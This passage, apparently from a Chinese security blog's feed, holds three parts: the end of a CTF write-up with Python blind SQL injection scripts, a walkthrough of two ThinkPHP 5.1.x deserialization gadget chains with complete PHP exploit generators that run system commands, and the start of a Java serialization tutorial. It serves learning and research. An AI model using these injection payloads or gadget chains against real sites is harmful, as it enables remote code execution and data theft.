class="string">&#x27;admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#x27;</span> + binascii.hexlify((<span class="string">&quot;^&quot;</span> + result + i).encode()).decode() + <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">                                                       <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, headers=headers)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;home&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>exp报错盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">string = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>]</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">chars = string.printable</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#  a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment">#&#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#&#x27;%(j,i,i), #数据库</span></span><br><span class="line">        <span class="comment"># &#x27;username&#x27;:&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/&quot;ctf&quot;),%d)),%d),710,1))#&#x27;%(j,i,i),#表</span></span><br><span class="line">         <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#&#x27;</span>%(j,i,i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;213&#x27;</span></span><br><span class="line">       &#125;   </span><br><span class="line">        rep =  req.post(url,data)</span><br><span class="line">        text = rep.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;home.php&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">            result += j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">           </span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://www.yang99.top/index.php/archives/48/">http://www.yang99.top/index.php/archives/48/</a></p><p><a href="https://www.zhaoj.in/read-6859.html">https://www.zhaoj.in/read-6859.html</a></p><p><a href="https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg">https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp 5.1.x 反序列化漏洞分析.md</title>
    <link href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/"/>
    <url>/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/</url>
    
    <content type="html"><![CDATA[<h1 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</span><br></pre></td></tr></table></figure><p>存在<code>__destruct()</code>方法</p><p><img src="https://ae01.alicdn.com/kf/Ue153544e99674753b354a81fa2d37f22w.jpg"></p><p>跟进removeFiles()，file_exists在处理filename时会当成字符串处理，只要让构造<code>$this-&gt;files</code>为包含类的数组就可以调用<code>__toString()</code></p><p><img src="https://ae01.alicdn.com/kf/U8e3f924c78034285a8a1e3c82c79c3ce7.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</span><br></pre></td></tr></table></figure><p>存在<code>_toString()</code></p><p><img src="https://ae01.alicdn.com/kf/U662f8ffb045e4216bf80f3a2ba789026B.jpg"></p><p><code>toJson()</code></p><p>调用<code>toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U461c285aba7b47d8b151dc337af9f213I.jpg"></p><p><code>toArray()</code></p><p>需要让<code>$this-&gt;visible</code>为空，<code>$this-&gt;hidden</code>为空，调用<code>getAttr()</code>。<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。</p><p><img src="https://ae01.alicdn.com/kf/U0afb602c82f54d19999c9022498e7e718.jpg"></p><p><code>getAttr()</code>满足条件<code>isset($this-&gt;withAttr[$fieldName])</code>即可命令执行，参数可控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$closure &#x3D; $this-&gt;withAttr[$fieldName];</span><br><span class="line">$value   &#x3D; $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p><p><code>getData()</code>，需要满足第二个条件<code>$this-&gt;data</code>数组中存在<code>$name</code>键，即可返回<code>$this-&gt;data[$name]</code></p><p><img src="https://ae01.alicdn.com/kf/U814f07fd9107466a9da9c0e9dad752f4q.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Loader.php</span><br></pre></td></tr></table></figure><p><code>Loader::parseName</code></p><p>parseName会把大写字母转为小写并在前面加上_，如<code>A</code>变成<code>_a</code>，不影响payload的构造</p><p><img src="https://ae01.alicdn.com/kf/Uece731b7f26a4d57bdcf284ab22b2924Y.jpg"></p><p>函数名为<code>$closure = $this-&gt;withAttr[$fieldName];</code>，<code>$fieldName</code>来源于经过<code>Loader::parseName</code>函数处理的<code>getAttr()</code>函数参数<code>$name</code>，而<code>getAttr()</code>函数参数等于<code>$data</code>的键名<code>$key</code>，<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。最终等于<code>$this-&gt;withAttr[$key]</code>。让数组<code>$this-&gt;withAttr</code>与<code>$this-&gt;data</code>有相同的键名即可</p><p>执行命令：<br><code>$value=$this-&gt;getData($name)</code>,<code>$name</code>为<code>getAttr()</code>参数，在<code>getData()</code>函数中只要满足<code>array_key_exists($name, $this-&gt;data</code>)就会返回<code>$this-&gt;data[$name]</code>，<code>$name</code>为传入参数等于键值$key，最终等于<code>$this-&gt;data[$key]</code>。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">withAttr</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">use</span> \<span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Process</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U60abe354ddfc4d3e8d3e92a008178e45f.jpg"></p><h1 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h1><p>前面的触发点都一样，区别在<code>toArray()</code>这里</p><p><code>toArray()</code></p><p>调用<code>_call()</code>方法，首先遍历数组<code>$this-&gt;append</code>，当键值<code>$name</code>为数组时满足<code>is_array($name)</code>。让<code>$relation</code>等于类名即可触发<code>_call()</code></p><p>在这之前按需要满足3个条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.$this-&gt;append不为空</span><br><span class="line">2.is_array($name)</span><br><span class="line">让$this-&gt;append等于二维数组，$this-&gt;append&#x3D;[$key-&gt;数组]</span><br><span class="line">3.!$relation</span><br><span class="line">构造$this-&gt;append[&#39;aaa&#39;]和 $this-&gt;relation&#x3D;[&#39;mmm&#39;&#x3D;&gt;&#39;&#39;];即可</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U459391197d914340af21fc63a2aa0558i.jpg"></p><p><code>getRelation()</code></p><p>满足<code>array_key_exists($name, $this-&gt;relation)</code>就会返回<code>$this-&gt;relation[$name]</code>。<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名。需要让<code>$this-&gt;relation[$name]</code>等于空才能满足<code>!$relation</code>执行下面的语句。</p><p><img src="https://ae01.alicdn.com/kf/U031c17d448de4072ac1f1cb6d26c64a8e.jpg"></p><p><code>getAttr()</code>返回$value，也就是经过<code>getData()</code>处理的参数<code>$key</code></p><p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p><p><code>getData()</code>，<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名<code>$key</code>，最终返回<code>$this-&gt;data[$name]</code>，让它等于一个存在<code>__call()</code>方法且不存在<code>visable()</code>方法的类即可调用<code>__call</code></p><p><img src="https://ae01.alicdn.com/kf/U7297b1d24af04ccab240da1344f9df3dC.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;Request.php</span><br></pre></td></tr></table></figure><p><code>__call()</code>,由于<code>array_unshift()</code>会修改参数数组，造成执行命令不可控，所以没办法直接利用这个<code>call_user_func_array</code>,只能寻找新的利用点</p><p><img src="https://ae01.alicdn.com/kf/Ua63f68ce9d2748798f794fb759e8cdb9k.jpg"></p><p><code>filterValue()</code>函数中存在<code>call_user_func</code>，但是<code>$value</code>不可控，不能直接利用</p><p><img src="https://ae01.alicdn.com/kf/Ufdada4a625b04e4295940acc23fae4c8A.jpg"></p><p><code>input()</code>函数中调用了<code>filterValue()</code>，参数不可控不能直接利用</p><p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p><p><code>param()</code>函数调用<code>input()</code>，执行<code>$this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，参数仍不可控。</p><p><img src="https://ae01.alicdn.com/kf/U15cd63721be540628c8127f9ae2d8163D.jpg"></p><p><code>isAjax()</code>调用<code>param()</code>，参数<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，这样<code>param()</code>函数中的<code>$name</code>参数可控，这样<code>input()</code>函数中的<code>$name</code>可控。<code>param()</code>函数可以接收<code>$_GET</code>数组赋值给<code>$this-&gt;param</code>，这样<code>input()</code>函数的前两个参数<code>$this-&gt;param</code>和<code>$name</code>都可控了</p><p><img src="https://ae01.alicdn.com/kf/Uadedd1ace0724bae913a1bc5ca99c814S.jpg"></p><p>回到<code>input()</code>函数，传入<code>filterValue()</code>函数的第一个参数<code>$data</code>和第三个<code>$filter</code>是执行命令的关键。$data等于<code>$this-&gt;getData($data,$name)</code>，两个函数参数就是<code>input()</code>传入的参数<code>$this-&gt;param</code>和<code>$name</code>。而<code>$filter</code>等于<code>$this-&gt;getFilter($filter, $default);</code></p><p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p><p><code>getData()</code>,最终<code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code>，也就是<code>$this-&gt;param[$this-&gt;config[&#39;var_ajax&#39;]]</code></p><p><img src="https://ae01.alicdn.com/kf/Uec06295fde6b4fa8978eb6e3f5847e39t.jpg"></p><p><code>getFilter()</code>，<code>$filter</code>来源于<code>$this-&gt;filter</code></p><p><img src="https://ae01.alicdn.com/kf/U2f4c13e776b44f79ba1ba227bc0063b3G.jpg"></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook=[<span class="string">&#x27;visible&#x27;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param=[<span class="string">&#x27;payload&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=[<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=[<span class="string">&#x27;mmm&#x27;</span>=&gt;[]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="keyword">new</span> Request()];<span class="comment">//等于new Request</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="comment">//use think\Process;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U4bbf06ed57dd48b48e13e1b84f31bffbz.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化学习</title>
    <link href="/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Serializeable"><a href="#Serializeable" class="headerlink" title="Serializeable"></a>Serializeable</h1><p>Seializeable是java实现序列化机制的工具，序列化数据包含对象类型和属性值。</p><p>Serializeable工具的简单说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只需要实现Serializeable接口就可以进行对象的序列化处理</span><br><span class="line">序列化对象可以是基本数据类型、集合类或其他对象</span><br><span class="line">使用transient、static关键字修饰的属性不会被序列化</span><br><span class="line">父类不可序列化时，需要父类中存在无参构造函数。</span><br></pre></td></tr></table></figure><p>相关接口和类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.io.Serializable</span><br><span class="line">java.io.Externalizable  &#x2F;&#x2F;该接口需要实现writeExternal和readExternal函数控制序列化</span><br><span class="line">ObjectOutput</span><br><span class="line">ObjectInput</span><br><span class="line">ObjectOutputStream</span><br><span class="line">ObjectInputStream</span><br></pre></td></tr></table></figure><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">OutputStream outputStream= <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectOutputStream对象中</span></span><br><span class="line">ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream((outputStream));</span><br><span class="line"><span class="comment">//此后调用writeObject()对客完成对象的序列化，并将其发送给OutputStream</span></span><br><span class="line">objectOutputStream.writeObject(Object);</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectOutputStream.close();</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectInputStream对象中</span></span><br><span class="line">ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream((inputStream));</span><br><span class="line"><span class="comment">//只需调用readObject(0即可完成对象的反序列化</span></span><br><span class="line">objectInputStream.readObject();</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectInputStream.close();</span><br><span class="line">inputStream.close();</span><br></pre></td></tr></table></figure><h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><p>一般一个类只要继承了Serializable接口，就代表该类和其子类都能进行JDK的序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 